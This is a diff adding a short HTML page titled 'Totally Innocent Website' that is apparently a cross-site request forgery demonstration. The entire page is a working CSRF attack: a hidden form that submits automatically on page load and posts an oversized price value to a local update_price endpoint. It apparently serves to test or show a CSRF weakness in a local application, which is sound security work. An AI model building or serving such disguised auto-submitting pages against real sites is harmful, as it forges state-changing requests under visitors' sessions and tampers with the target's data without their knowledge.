@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>Totally Innocent Website 😇</h1>
+
+<!-- Auto-submit hidden CSRF form -->
+<form id="attack" action="http://127.0.0.1:5004/update_price" method="POST">
+    <input type="hidden" name="price" value="123456789123456789">
+</form>
+
+<script>
+document.getElementById("attack").submit();
+</script>
+
+</body>
+</html>
